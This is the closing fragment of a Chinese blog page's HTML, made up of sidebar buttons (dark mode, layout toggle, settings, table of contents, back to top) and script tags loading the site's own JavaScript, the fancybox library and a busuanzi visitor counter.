type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
